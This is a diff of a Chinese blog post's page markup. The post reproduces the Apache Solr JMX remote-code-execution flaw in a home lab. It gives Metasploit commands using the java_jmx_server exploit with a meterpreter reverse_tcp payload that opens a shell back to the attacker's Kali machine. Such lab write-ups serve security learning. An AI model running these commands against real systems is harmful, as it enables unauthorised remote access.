@@ -87,7 +87,7 @@ Ubuntu:192.168.43.131首先我们在Ubuntu上安装 So,">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.5k
+                    2.1k
                 </span>
                 
                 
@@ -130,13 +130,13 @@ Ubuntu:192.168.43.131首先我们在Ubuntu上安装 So,">
             <p>这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)<br><a id="more"></a></p>
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
 <li>Kali:192.168.43.141</li>
-<li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></div></figure>
+<li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></div></figure></p>
+<p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/start.png" alt><br>显示这样，说明环境搭建好了</p>
 <p>查看bin目录下的solr.in.sh<br><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/JMX.png" alt><br>看这里开启了JMX，默认端口为18983</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/success.png" alt></p>
 <p>虽然这个漏洞利用起来很方便的，但是影响范围比较小，其实也就两个版本可以利用，其他版本开启这个配置的几率也不高，留着以后有机会打吧。</p>
 
